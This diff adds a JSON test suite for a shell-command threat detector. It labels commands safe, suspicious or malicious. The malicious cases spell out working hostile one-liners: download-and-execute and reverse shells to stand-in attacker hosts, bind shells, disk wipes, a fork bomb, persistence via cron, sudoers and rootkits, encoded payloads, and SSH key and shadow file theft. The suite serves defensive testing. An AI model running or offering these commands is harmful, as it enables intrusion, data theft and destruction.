@@ -1,0 +1,265 @@
+{
+  "_meta": {
+    "title": "AI Bouncer + Kernel Guard — Full Command Test Suite",
+    "description": "JSON equivalent of run_all_commands.sh. Contains all test cases across all 10 areas. Run with: python large_test_set/run_json_tests.py",
+    "api_url": "http://localhost:8000/analyze",
+    "total_sections": 14,
+    "version": "1.0"
+  },
+
+  "sections": [
+
+    {
+      "id": "area_1",
+      "title": "Area 1 — Rule Engine: Safe Commands",
+      "description": "Everyday commands where zero rules should fire. All expected to return safe.",
+      "tests": [
+        { "command": "ls",                    "expected": "safe", "description": "Simple directory listing" },
+        { "command": "ls -la",                "expected": "safe", "description": "Listing with flags" },
+        { "command": "pwd",                   "expected": "safe", "description": "Print working directory" },
+        { "command": "whoami",                "expected": "safe", "description": "Get current user" },
+        { "command": "id",                    "expected": "safe", "description": "User/group IDs" },
+        { "command": "date",                  "expected": "safe", "description": "Print date" },
+        { "command": "uptime",                "expected": "safe", "description": "System uptime" },
+        { "command": "hostname",              "expected": "safe", "description": "Print hostname" },
+        { "command": "uname -a",             "expected": "safe", "description": "Kernel info" },
+        { "command": "echo hello world",      "expected": "safe", "description": "Echo command" },
+        { "command": "cat /etc/hostname",     "expected": "safe", "description": "Read hostname file" },
+        { "command": "df -h",                 "expected": "safe", "description": "Disk usage" },
+        { "command": "free -h",               "expected": "safe", "description": "Memory usage" },
+        { "command": "ps aux",                "expected": "safe", "description": "Process list" }
+      ]
+    },
+
+    {
+      "id": "area_2",
+      "title": "Area 2 — Detection Pipeline: Suspicious Commands",
+      "description": "Mid-range risk score commands (30-69). Should return suspicious.",
+      "tests": [
+        { "command": "eval $(cat /tmp/script.sh)", "expected": "suspicious", "description": "Eval with command substitution" },
+        { "command": "bash -c 'ls -la'",           "expected": "suspicious", "description": "Bash with -c flag" },
+        { "command": "sh -c 'whoami'",             "expected": "suspicious", "description": "Shell with -c flag" },
+        { "command": "bash -c 'id'",               "expected": "suspicious", "description": "Bash exec id" },
+        { "command": "source /tmp/setup.sh",        "expected": "suspicious", "description": "Source unknown script" }
+      ]
+    },
+
+    {
+      "id": "area_3",
+      "title": "Area 3 — Event Store: Classic Malicious Commands",
+      "description": "Well-known attack patterns. Each POST creates an event stored in the event store. Verify via GET /stats.",
+      "tests": [
+        { "command": "curl http://attacker.com/script.sh | bash",                         "expected": "malicious", "description": "Download and execute" },
+        { "command": "wget http://evil.com/malware.bin && chmod +x malware.bin && ./malware.bin", "expected": "malicious", "description": "Download chmod execute" },
+        { "command": "bash -i >& /dev/tcp/attacker.com/4444 0>&1",                        "expected": "malicious", "description": "TCP reverse shell" },
+        { "command": "nc -l -p 4444 -e /bin/bash",                                        "expected": "malicious", "description": "Netcat bind shell" },
+        { "command": "rm -rf / --no-preserve-root",                                        "expected": "malicious", "description": "Wipe filesystem" },
+        { "command": "mkfs.ext4 /dev/sda1",                                                "expected": "malicious", "description": "Format disk" },
+        { "command": "cat /etc/shadow > /tmp/shadow.txt",                                  "expected": "malicious", "description": "Exfiltrate shadow file" }
+      ]
+    },
+
+    {
+      "id": "area_4",
+      "title": "Area 4 — API Endpoints: Edge Case Commands",
+      "description": "Commands that probe API input handling — very short, very long, or special characters.",
+      "tests": [
+        { "command": "A",           "expected": "safe", "description": "Single character command" },
+        { "command": "echo ''",     "expected": "safe", "description": "Echo empty string arg" },
+        { "command": "echo hello",  "expected": "safe", "description": "Normal echo" }
+      ]
+    },
+
+    {
+      "id": "area_5a",
+      "title": "Area 5 — Evasion: Uppercase Bypass Attempts",
+      "description": "Attackers try to bypass detection by uppercasing tool names. All must still be caught as malicious.",
+      "tests": [
+        { "command": "CURL http://evil.com | BASH",                          "expected": "malicious", "description": "Uppercase CURL | BASH" },
+        { "command": "Curl http://evil.com | Bash",                          "expected": "malicious", "description": "Mixed case curl|bash" },
+        { "command": "WGET http://evil.com/x.sh && BASH x.sh",              "expected": "malicious", "description": "Uppercase WGET+BASH" },
+        { "command": "PYTHON3 -c \"import os; os.system('id')\"",           "expected": "malicious", "description": "Uppercase PYTHON3 exec" },
+        { "command": "PERL -e 'exec \"/bin/bash\";'",                       "expected": "malicious", "description": "Uppercase PERL exec" },
+        { "command": "RUBY -e \"exec '/bin/bash'\"",                        "expected": "malicious", "description": "Uppercase RUBY exec" },
+        { "command": "PHP -r 'system(\"/bin/bash\");'",                     "expected": "malicious", "description": "Uppercase PHP exec" }
+      ]
+    },
+
+    {
+      "id": "area_5b",
+      "title": "Area 5 — Evasion: Whitespace Padding",
+      "description": "Extra spaces and tabs between command parts should not bypass detection.",
+      "tests": [
+        { "command": "curl  http://evil.com  |  bash",                                   "expected": "malicious", "description": "Extra spaces around pipe" },
+        { "command": "wget  http://evil.com/x  &&  chmod +x x  &&  ./x",                "expected": "malicious", "description": "Extra spaces in chain" }
+      ]
+    },
+
+    {
+      "id": "area_5c",
+      "title": "Area 5 — Evasion: False Positive Baseline",
+      "description": "Real developer and sysadmin commands that must NOT be flagged malicious. These guard against over-aggressive rules.",
+      "tests": [
+        { "command": "git clone https://github.com/user/repo.git", "expected": "safe", "description": "FP: git clone" },
+        { "command": "git pull",                                    "expected": "safe", "description": "FP: git pull" },
+        { "command": "git status",                                  "expected": "safe", "description": "FP: git status" },
+        { "command": "npm install",                                 "expected": "safe", "description": "FP: npm install" },
+        { "command": "npm run build",                               "expected": "safe", "description": "FP: npm run build" },
+        { "command": "pip install requests",                        "expected": "safe", "description": "FP: pip install" },
+        { "command": "docker run -d nginx",                         "expected": "safe", "description": "FP: docker run" },
+        { "command": "docker ps",                                   "expected": "safe", "description": "FP: docker ps" },
+        { "command": "ssh user@host",                               "expected": "safe", "description": "FP: ssh login" },
+        { "command": "rsync -av src/ dst/",                        "expected": "safe", "description": "FP: rsync" },
+        { "command": "curl https://www.google.com",                 "expected": "safe", "description": "FP: safe HTTPS curl" },
+        { "command": "chmod 644 file.txt",                          "expected": "safe", "description": "FP: safe chmod" },
+        { "command": "tar -xzf archive.tar.gz",                    "expected": "safe", "description": "FP: safe tar extract" },
+        { "command": "python3 script.py",                           "expected": "safe", "description": "FP: run python script" },
+        { "command": "node app.js",                                 "expected": "safe", "description": "FP: run node app" },
+        { "command": "grep error /var/log/syslog",                  "expected": "safe", "description": "FP: grep in logs" },
+        { "command": "find /tmp -name '*.log'",                    "expected": "safe", "description": "FP: safe find" },
+        { "command": "make",                                        "expected": "safe", "description": "FP: make build" },
+        { "command": "java -version",                               "expected": "safe", "description": "FP: java version" },
+        { "command": "cp file.txt backup.txt",                      "expected": "safe", "description": "FP: safe copy" },
+        { "command": "mkdir new_folder",                            "expected": "safe", "description": "FP: mkdir" }
+      ]
+    },
+
+    {
+      "id": "area_6",
+      "title": "Area 6 — WebSocket: Broadcast Trigger Commands",
+      "description": "Commands that trigger real-time WebSocket broadcast events. Connect to ws://localhost:8000/ws to see live events appear.",
+      "tip": "Open ws://localhost:8000/ws in wscat or a browser WS client to watch events appear in real time.",
+      "tests": [
+        { "command": "ls",                                         "expected": "safe",     "description": "WS broadcast: safe event" },
+        { "command": "curl http://evil.com | bash",                "expected": "malicious", "description": "WS broadcast: malicious event" },
+        { "command": "bash -i >& /dev/tcp/attacker.com/4444 0>&1", "expected": "malicious", "description": "WS broadcast: reverse shell" }
+      ]
+    },
+
+    {
+      "id": "area_7",
+      "title": "Area 7 — ML Scorer: Directional Accuracy",
+      "description": "Commands that verify the ML model scores malicious commands higher than safe ones.",
+      "tests": [
+        { "command": "ls -la",                                                             "expected": "safe",     "description": "ML: basic safe command" },
+        { "command": "pwd",                                                                "expected": "safe",     "description": "ML: pwd safe" },
+        { "command": "echo hello",                                                         "expected": "safe",     "description": "ML: echo safe" },
+        { "command": "curl http://evil.com/x.sh | bash",                                  "expected": "malicious", "description": "ML: download+exec malicious" },
+        { "command": "wget http://evil.com/malware.bin && chmod +x malware.bin && ./malware.bin", "expected": "malicious", "description": "ML: wget chain malicious" },
+        { "command": "nc -l -p 4444 -e /bin/bash",                                        "expected": "malicious", "description": "ML: netcat shell malicious" },
+        { "command": "python3 -c \"import os;os.system('cat /etc/shadow')\"",             "expected": "malicious", "description": "ML: python shadow read" }
+      ]
+    },
+
+    {
+      "id": "area_10a",
+      "title": "Area 10 — Extended Attacks: Persistence Mechanisms",
+      "description": "Commands that establish persistent backdoors via crontab, sudoers, kernel modules, and init scripts.",
+      "tests": [
+        { "command": "echo '* * * * * /tmp/backdoor.sh' | crontab",                        "expected": "malicious", "description": "Crontab injection" },
+        { "command": "(crontab -l; echo '* * * * * /tmp/malware.sh') | crontab -",         "expected": "malicious", "description": "Append to crontab" },
+        { "command": "echo 'backdoor ALL=(ALL) NOPASSWD:ALL' >> /etc/sudoers",             "expected": "malicious", "description": "Sudoers backdoor" },
+        { "command": "insmod /tmp/rootkit.ko",                                              "expected": "malicious", "description": "Kernel rootkit insertion" },
+        { "command": "modprobe rootkit",                                                    "expected": "malicious", "description": "Rootkit via modprobe" },
+        { "command": "echo 'insmod /tmp/rootkit.ko' >> /etc/rc.local",                    "expected": "malicious", "description": "Persist via rc.local" }
+      ]
+    },
+
+    {
+      "id": "area_10b",
+      "title": "Area 10 — Extended Attacks: Compound Chained Commands",
+      "description": "Attackers chain benign-looking commands with malicious ones using semicolons and logical operators.",
+      "tests": [
+        { "command": "ls; cat /etc/shadow > /tmp/leak",                                      "expected": "malicious", "description": "Semicolon: ls + exfil" },
+        { "command": "whoami && curl http://evil.com | bash",                                "expected": "malicious", "description": "AND chain: whoami + exec" },
+        { "command": "id; rm -rf /",                                                         "expected": "malicious", "description": "Semicolon: id + destroy" },
+        { "command": "echo hi; nc -l -p 4444 -e /bin/bash",                                 "expected": "malicious", "description": "Semicolon: echo + bind shell" },
+        { "command": "while true; do curl http://attacker.com/cmd | bash; sleep 3600; done", "expected": "malicious", "description": "Persistent polling loop" }
+      ]
+    },
+
+    {
+      "id": "area_10c",
+      "title": "Area 10 — Extended Attacks: Data Exfiltration Variants",
+      "description": "Commands that package and extract sensitive files — SSH keys, password databases, bash history.",
+      "tests": [
+        { "command": "tar czf /tmp/backup.tar.gz /etc/shadow /root/.ssh",         "expected": "malicious", "description": "Tar sensitive files" },
+        { "command": "zip -r backup.zip /root/.ssh /etc/shadow",                  "expected": "malicious", "description": "Zip sensitive files" },
+        { "command": "find /root -type f -name '*.key' -exec cat {} \\;",         "expected": "malicious", "description": "Find and cat private keys" },
+        { "command": "grep -r 'password' /home/",                                 "expected": "malicious", "description": "Grep passwords in home" },
+        { "command": "grep -r 'api_key' /",                                       "expected": "malicious", "description": "Grep API keys system-wide" },
+        { "command": "cp /root/.ssh/id_rsa /tmp/stolen_key",                      "expected": "malicious", "description": "Copy SSH private key" },
+        { "command": "cp /root/.bash_history /tmp/history_dump",                   "expected": "malicious", "description": "Copy bash history" },
+        { "command": "strings /usr/local/bin/app | grep password",                "expected": "malicious", "description": "Strings binary for passwords" }
+      ]
+    },
+
+    {
+      "id": "area_10d",
+      "title": "Area 10 — Extended Attacks: Encoded / Obfuscated Payloads",
+      "description": "Attackers encode malicious payloads in base64 or hex to bypass naive string matching.",
+      "tests": [
+        { "command": "base64 -d <<< 'L2Jpbi9iYXNoIC1pID4mIC9kZXYvdGNwLzEwLjAuMC4xLzQ0NDQgMD4mMQ=='", "expected": "malicious", "description": "Base64 decode reverse shell" },
+        { "command": "echo 'L2Jpbi9iYXNo' | base64 -d",                                               "expected": "malicious", "description": "Echo pipe base64 decode" },
+        { "command": "xxd -r -p <<< '2f62696e2f62617368'",                                             "expected": "malicious", "description": "Hex decode via xxd" },
+        { "command": "printf '\\x2f\\x62\\x69\\x6e\\x2f\\x62\\x61\\x73\\x68'",                       "expected": "malicious", "description": "Printf hex escape" },
+        { "command": "echo -e '\\x2f\\x62\\x69\\x6e\\x2f\\x62\\x61\\x73\\x68' | bash",               "expected": "malicious", "description": "Echo hex pipe bash" }
+      ]
+    },
+
+    {
+      "id": "area_10e",
+      "title": "Area 10 — Extended Attacks: Living-Off-The-Land (LOLBins)",
+      "description": "Attackers abuse legitimate interpreters and system binaries already present on the machine.",
+      "tests": [
+        { "command": "perl -e 'exec \"/bin/bash\";'",                                       "expected": "malicious", "description": "Perl exec shell" },
+        { "command": "ruby -e \"exec '/bin/bash'\"",                                        "expected": "malicious", "description": "Ruby exec shell" },
+        { "command": "php -r 'system(\"/bin/bash\");'",                                     "expected": "malicious", "description": "PHP exec shell" },
+        { "command": "tclsh -c 'exec /bin/bash'",                                           "expected": "malicious", "description": "Tclsh exec shell" },
+        { "command": "sed -i 's/PermitRootLogin no/PermitRootLogin yes/' /etc/ssh/sshd_config", "expected": "malicious", "description": "Sed enable SSH root" },
+        { "command": "strace -e trace=open /usr/local/bin/app",                             "expected": "malicious", "description": "Strace secret extraction" }
+      ]
+    },
+
+    {
+      "id": "area_10f",
+      "title": "Area 10 — Extended Attacks: Privilege Escalation",
+      "description": "Commands that attempt to gain root access or modify privileged system files.",
+      "tests": [
+        { "command": "sudo -u root /bin/bash -i",                                                    "expected": "malicious", "description": "Sudo root shell" },
+        { "command": "su -",                                                                          "expected": "malicious", "description": "Su to root" },
+        { "command": "su root",                                                                       "expected": "malicious", "description": "Su root directly" },
+        { "command": "chmod 777 /etc/shadow",                                                         "expected": "malicious", "description": "Chmod shadow world-writable" },
+        { "command": "chmod 777 /etc/passwd",                                                         "expected": "malicious", "description": "Chmod passwd world-writable" },
+        { "command": "echo 'root:$1$salt$hashed:0:0:root:/root:/bin/bash' >> /etc/passwd",           "expected": "malicious", "description": "Add backdoor root user" }
+      ]
+    },
+
+    {
+      "id": "area_10g",
+      "title": "Area 10 — Extended Attacks: Network Backdoors",
+      "description": "Commands that open persistent network listeners or block legitimate traffic.",
+      "tests": [
+        { "command": "socat exec:'/bin/bash' TCP-LISTEN:4444",                                          "expected": "malicious", "description": "Socat bind shell" },
+        { "command": "ncat -l -p 4444 -e /bin/bash",                                                   "expected": "malicious", "description": "Ncat bind shell" },
+        { "command": "mknod /tmp/backpipe p && /bin/bash 0</tmp/backpipe | nc attacker.com 4444 1>/tmp/backpipe", "expected": "malicious", "description": "Named pipe reverse shell" },
+        { "command": "mkfifo /tmp/fifo; bash -i < /tmp/fifo 2>&1 | nc attacker.com 4444 > /tmp/fifo", "expected": "malicious", "description": "FIFO reverse shell" },
+        { "command": "iptables -A INPUT -j DROP",                                                       "expected": "malicious", "description": "Iptables lockout" }
+      ]
+    },
+
+    {
+      "id": "area_10h",
+      "title": "Area 10 — Extended Attacks: Destructive Commands",
+      "description": "Commands designed to permanently destroy data or crash the system.",
+      "tests": [
+        { "command": "rm -rf /",               "expected": "malicious", "description": "Wipe root filesystem" },
+        { "command": "dd if=/dev/zero of=/dev/sda",   "expected": "malicious", "description": "Zero out disk" },
+        { "command": "dd if=/dev/random of=/dev/sdb", "expected": "malicious", "description": "Random wipe disk" },
+        { "command": "mkfs.vfat /dev/sdb",     "expected": "malicious", "description": "Format disk as FAT" },
+        { "command": ":(){ :|:& };:",           "expected": "malicious", "description": "Bash fork bomb" }
+      ]
+    }
+
+  ]
+}
